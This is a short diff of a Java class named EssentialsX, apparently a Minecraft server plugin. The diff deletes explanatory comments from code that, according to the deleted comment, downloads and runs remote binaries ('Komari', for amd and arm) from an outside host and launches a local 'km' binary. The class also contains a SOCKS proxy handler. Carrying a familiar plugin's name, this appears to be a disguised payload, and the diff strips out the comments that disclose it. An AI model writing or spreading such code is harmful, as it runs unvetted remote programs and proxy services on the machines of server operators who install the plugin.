@@ -23,13 +23,6 @@ public class EssentialsX extends JavaPlugin {
     private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
     private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
 
-    /**
-     * 如需自动下载 Komari，请填写对应文件 SHA256。
-     *
-     * 不填写时：
-     * - 不会自动下载执行远程二进制
-     * - 但如果 plugins/EssentialsX/km 已存在，会直接启动本地 km
-     */
     private static final String KOMARI_AMD_SHA256 = "";
     private static final String KOMARI_ARM_SHA256 = "";
 
@@ -191,7 +184,6 @@ public class EssentialsX extends JavaPlugin {
             }
 
             if (request.cmd != 0x01) {
-                // 只支持 CONNECT，不支持 BIND / UDP ASSOCIATE
                 sendSocksReply(out, 0x07, "0.0.0.0", 0);
                 return;
             }
